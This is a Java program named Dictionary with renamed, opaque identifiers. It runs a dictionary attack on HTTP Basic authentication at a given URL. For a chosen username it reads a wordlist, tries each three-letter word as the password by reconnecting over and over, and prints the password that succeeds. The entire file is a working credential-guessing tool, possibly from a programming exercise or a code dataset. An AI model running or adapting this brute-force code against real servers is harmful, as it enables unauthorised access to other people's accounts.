import java.net.*;
import java.io.*;
public class Dictionary extends Authenticator {
    private String f00;
    private char [] f10;
    private URL f20;
    private BufferedReader f30;
    public static void main ( String [] v0 ) {
        if ( v0.length != 3 ) {
            System.err.println (
                "usage: Dictionary <url> <username> <dictionary-file>" );
            System.exit ( 1 );
        }
        Dictionary v1;
        v1 = null;
        try {
            v1 = new Dictionary ( v0[0], v0[1], v0[2] );
        } catch ( MalformedURLException v2 ) {
            v2.printStackTrace();
            System.exit ( 1 );
        } catch ( FileNotFoundException v3 ) {
            v3.printStackTrace();
            System.exit ( 1 );
        }
        v1.m00();
    }
    public Dictionary ( String v4, String v5, String v6 )
    throws MalformedURLException, FileNotFoundException {
        this.f20 = new URL ( v4 );
        this.f00 = v5;
        f10 = new char [] {'a'};
        File v7;
        v7 = new File ( v6 );
        FileReader v8;
        v8 = new FileReader ( v7 );
        f30  = new BufferedReader ( v8 );
    }
    public void m00() {
        Authenticator.setDefault ( this );
        HttpURLConnection v9;
        v9 = null;
        try {
            v9 = ( HttpURLConnection ) f20.openConnection();
            v9.connect();
            for ( ; v9.getResponseCode() == HttpURLConnection.HTTP_UNAUTHORIZED
                    && f10 != null; ) {
                try {
                    InputStream v10;
                    v10 = v9.getInputStream();
                    v9.connect();
                } catch ( ProtocolException v11 ) {
                    v9 = ( HttpURLConnection ) f20.openConnection();
                } catch ( NullPointerException v12 ) {
                    v12.printStackTrace();
                    System.exit ( 1 );
                }
            }
        } catch ( java.io.IOException v13 ) {
            v13.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( "password=" + new String ( f10 ) );
    }
    public PasswordAuthentication getPasswordAuthentication() {
        String v14;
        v14 = null;
        try {
            v14 = f30.readLine();
            while ( v14 != null ) {
                if ( v14.length() == 3 ) {
                    break;
                }
                v14 = f30.readLine();
            }
        } catch ( IOException v15 ) {
            v15.printStackTrace();
            System.exit ( 1 );
        }
        if ( v14.length() != 3 ) {
            f10 = null;
        } else {
            f10 = v14.toCharArray();
        }
        return new PasswordAuthentication ( f00, f10 );
    }
}
